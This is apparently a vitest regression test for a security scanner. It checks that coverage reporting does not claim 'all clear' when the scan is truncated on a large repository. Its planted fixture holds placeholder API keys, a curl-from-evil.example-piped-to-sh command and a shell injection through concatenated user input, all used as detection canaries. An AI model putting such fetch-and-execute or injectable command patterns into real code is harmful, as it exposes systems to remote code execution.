import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { HardeningScanner } from '../../src/hardening/scanner';
import {
  summarizeCoverage,
  CHECK_METHOD_PREFIXES,
  SEMANTIC_PREFIXES,
  UNREACHABLE_PREFIXES,
  categoryForPrefix,
  categoryForCheckId,
} from '../../src/hardening/coverage-ledger';
import { runNanoMindScan } from '../../src/nanomind-core/scanner-bridge';

/**
 * `secure` reported `100/100`, `0 skipped` and `Categories … (all clear)` on a
 * 528-file repo carrying a hardcoded Anthropic key, an AWS key and a
 * `curl … | sh`. Not a missed detection — a false assurance line, and worse
 * than silence because it invites the reader to record a pass. `secure` is
 * Phase 4 of `/pre-push-review`, so every gated repo was getting it.
 *
 * The bug survived because every existing test uses a small controlled
 * fixture, which is exactly the case that already works: on a 1-file tree the
 * planted key IS caught. It only disappears once the tree is big enough for
 * the semantic layer's 200-file cap to fire. So the fixture here is
 * deliberately larger than that cap — a small fixture cannot reproduce this.
 */

/** A planted secret shaped like the real thing. Not a live credential. */
const PLANTED_ANTHROPIC_KEY = `sk-ant-api03-${'A'.repeat(86)}AA`;

const PLANTED_SOURCE = `// Planted detection canary. Not real credentials.
import { exec, execSync } from 'child_process';

const ANTHROPIC_KEY = "${PLANTED_ANTHROPIC_KEY}";
const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";

export function bootstrap() {
  exec('curl -s https://evil.example/x.sh | sh');
}

export function listDir(userInput) {
  return execSync('ls ' + userInput);
}

export { ANTHROPIC_KEY, AWS_ACCESS_KEY_ID };
`;

/** Filler that is eligible for the compile set but carries nothing to find. */
const FILLER = `export function helper(n) {
  return n + 1;
}
`;

async function scanWithCoverage(dir: string) {
  const scanner = new HardeningScanner();
  const result = await scanner.scan({ targetDir: dir });
  const nm = await runNanoMindScan(dir, [], result.projectType);
  const truncations = nm.compileSetTruncated
    ? [
        ...(result.coverage?.truncations ?? []),
        {
          layer: 'semantic',
          cap: nm.compiledArtifacts,
          prefixes: [...SEMANTIC_PREFIXES],
          reason: 'semantic pass capped',
        },
      ]
    : (result.coverage?.truncations ?? []);
  const allFailed = [
    ...result.findings.filter(f => !f.passed),
    ...nm.mergedFindings.filter(f => !f.passed),
  ];
  const categories = summarizeCoverage(
    result.coverage?.executions ?? [],
    truncations,
    {
      ...(nm.compiledArtifacts > 0
        ? { semantic: { prefixes: [...SEMANTIC_PREFIXES], artifactsCompiled: nm.compiledArtifacts } }
        : {}),
      // Both layers: the static scan's findings AND the semantic pass's. The
      // CLI feeds the merged `failed` list, so the helper must too — passing
      // only the semantic half would file `git hygiene` as unexamined while
      // `GIT-001` sits in the same report.
      observedCheckIds: allFailed.map(f => f.checkId),
    },
  );
  return { result, nm, categories, allFailed };
}

describe('secure coverage honesty', () => {
  describe('the planted pattern is genuinely detectable (vacuity guard)', () => {
    let small: string;
    beforeAll(() => {
      small = mkdtempSync(join(tmpdir(), 'hma-cov-small-'));
      writeFileSync(join(small, 'planted.js'), PLANTED_SOURCE);
    });
    afterAll(() => rmSync(small, { recursive: true, force: true }));

    /**
     * Without this, the large-tree assertions below could pass because the
     * planted content is undetectable everywhere, which would make the whole
     * file vacuous. It has to FIRE on a tree the scan fully examines.
     */
    it('fires AST-CRED on a small tree the scan fully examines', async () => {
      const { nm } = await scanWithCoverage(small);
      const ids = nm.mergedFindings.filter(f => !f.passed).map(f => f.checkId);
      expect(ids.some(id => id.startsWith('AST-CRED'))).toBe(true);
      expect(nm.compileSetTruncated).toBe(false);
    }, 120_000);
  });

  describe('on a tree larger than the semantic cap', () => {
    let big: string;
    let scan: Awaited<ReturnType<typeof scanWithCoverage>>;

    beforeAll(async () => {
      big = mkdtempSync(join(tmpdir(), 'hma-cov-big-'));
      // Comfortably past MAX_FILES_PER_SCAN (200) so the cap is certain to
      // fire regardless of the order `readdir` hands back.
      const bulk = join(big, 'src');
      mkdirSync(bulk, { recursive: true });
      for (let i = 0; i < 260; i++) {
        writeFileSync(join(bulk, `mod-${String(i).padStart(3, '0')}.js`), FILLER);
      }
      const late = join(big, 'zz-late');
      mkdirSync(late, { recursive: true });
      writeFileSync(join(late, 'planted.js'), PLANTED_SOURCE);
      scan = await scanWithCoverage(big);
    }, 300_000);

    afterAll(() => rmSync(big, { recursive: true, force: true }));

    it('reports the compile set as truncated rather than as a file count', () => {
      expect(scan.nm.compileSetTruncated).toBe(true);
    });

    /**
     * THE REGRESSION. Pre-fix there was no coverage record at all, and every
     * category — including the ones the capped semantic pass could no longer
     * speak for — was seeded `clear: true` from the taxonomy and printed
     * inside "(all clear)".
     *
     * A capped pass covers the files it reached and is blind to the rest, so
     * no category it credits may claim full examination.
     */
    it('never reports a semantically-credited category as fully examined', () => {
      const semanticCategories = new Set(
        SEMANTIC_PREFIXES.map(categoryForPrefix).filter((c): c is string => c !== null),
      );
      const wronglyClear = scan.categories.filter(
        c => semanticCategories.has(c.category) && c.state === 'examined',
      );
      expect(wronglyClear.map(c => c.category)).toEqual([]);
    });

    it('reports credentials as partial, not clear, while the key sits unread', () => {
      const credentials = scan.categories.find(c => c.category === 'credentials');
      expect(credentials).toBeDefined();
      expect(credentials!.state).toBe('truncated');
      expect(credentials!.reason).toBeTruthy();
    });

    /**
     * The fail-closed invariant, stated in both directions so neither can be
     * satisfied by an empty set: `examined` requires a content read, and
     * anything not examined must carry a reason rather than a bare state.
     */
    it('grants examined only on evidence — a read file or a reported finding', () => {
      expect(scan.categories.length).toBeGreaterThan(0);
      for (const c of scan.categories) {
        if (c.state === 'examined') {
          // Evidence is either bytes read or a finding emitted. Checks that
          // assert on ABSENCE (a missing .gitignore) read nothing and are
          // carried by the second clause.
          const byRead = c.filesRead > 0;
          const byFinding = c.methods.includes('reported-finding');
          expect(byRead || byFinding, `${c.category} claims examined with no evidence`).toBe(true);
          expect(c.methods.length, `${c.category} claims examined`).toBeGreaterThan(0);
        } else {
          expect(c.reason, `${c.category} lacks a reason`).toBeTruthy();
        }
      }
      // Non-vacuous: this tree must actually exercise both branches.
      expect(scan.categories.some(c => c.state === 'examined')).toBe(true);
      expect(scan.categories.some(c => c.state !== 'examined')).toBe(true);
    });

    /**
     * Two lines of one report contradicting each other is the defect class
     * this ledger exists to remove, so no category may be filed as unexamined
     * while the same run reports a finding in it.
     */
    it('never files a category as unexamined while reporting a finding in it', () => {
      const reported = new Set(
        scan.allFailed
          .map(f => categoryForCheckId(f.checkId))
          .filter((c): c is string => c !== null),
      );
      // Non-vacuous: the fixture must actually report findings.
      expect(reported.size).toBeGreaterThan(0);
      const contradictions = scan.categories.filter(
        c => c.state === 'not-examined' && reported.has(c.category),
      );
      expect(contradictions.map(c => c.category)).toEqual([]);
    });

    it('counts files read as a measurement, not as the cap', () => {
      const examined = scan.result.coverage!.filesExamined;
      // 260 filler + 1 planted are all compile-eligible, so a number equal to
      // the 200-file cap would mean the count is the cap wearing a new label.
      expect(examined).toBeGreaterThan(200);
    });
  });

  describe('registration stays in step with the scanner', () => {
    const scannerSrc = readFileSync(
      join(__dirname, '../../src/hardening/scanner.ts'),
      'utf-8',
    );

    /**
     * A `check*` method added to the orchestration without a registration
     * would report its category as never examined forever — understating, so
     * safe, but silently wrong. This fails on that instead.
     */
    it('registers every check method the scan orchestrates', () => {
      const called = new Set(
        [...scannerSrc.matchAll(/await this\.coverage\.run\('(\w+)'/g)].map(m => m[1]),
      );
      expect(called.size).toBeGreaterThan(50);
      const unregistered = [...called].filter(m => !(m in CHECK_METHOD_PREFIXES));
      expect(unregistered).toEqual([]);
    });

    it('leaves no orchestrated check call unwrapped', () => {
      // A bare `await this.checkX(` in the orchestration would run outside the
      // ledger, so its reads would be attributed to nothing.
      const bare = [
        ...scannerSrc.matchAll(/(?:const \w+ = )?await this\.(check\w+)\(/g),
      ].map(m => m[1]);
      expect(bare).toEqual([]);
    });

    it('maps every registered prefix to a category the renderer knows', () => {
      for (const [method, prefixes] of Object.entries(CHECK_METHOD_PREFIXES)) {
        for (const prefix of prefixes) {
          expect(categoryForPrefix(prefix), `${method} -> ${prefix}`).toBeTruthy();
        }
      }
      for (const prefix of SEMANTIC_PREFIXES) {
        expect(categoryForPrefix(prefix), `semantic ${prefix}`).toBeTruthy();
      }
    });

    /**
     * `CODEINJ-001`, `TMPPATH-001` and `ENVLEAK-001` are implemented, counted
     * in the advertised `310 static`, and called from nowhere. If someone
     * wires one in, this fails so the constant — and the `--json` claim built
     * from it — gets corrected rather than quietly becoming false.
     */
    it('keeps the unreachable-check list true', () => {
      const methodFor: Record<string, string> = {
        CODEINJ: 'checkCodeInjection',
        TMPPATH: 'checkTmpPaths',
        ENVLEAK: 'checkEnvLeak',
      };
      for (const prefix of UNREACHABLE_PREFIXES) {
        const method = methodFor[prefix];
        expect(method, `no method recorded for ${prefix}`).toBeTruthy();
        expect(
          scannerSrc.includes(`this.${method}(`),
          `${method} now has a caller — remove ${prefix} from UNREACHABLE_PREFIXES`,
        ).toBe(false);
      }
    });
  });
});
